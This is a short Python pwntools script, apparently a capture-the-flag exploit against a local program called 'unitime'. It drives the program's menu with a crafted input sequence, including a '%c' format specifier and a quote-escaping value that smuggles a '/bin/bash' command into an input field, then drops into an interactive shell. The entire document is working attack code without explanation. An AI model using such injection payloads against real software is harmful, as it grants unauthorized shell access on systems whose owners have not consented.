from pwn import *

proc = process('./unitime')
proc.sendline("1\n%c\n3\nhello\n5\nn\n3\n';/bin/bash #\\\n3\n';/bin/bash #\\\n4\n")
proc.interactive()
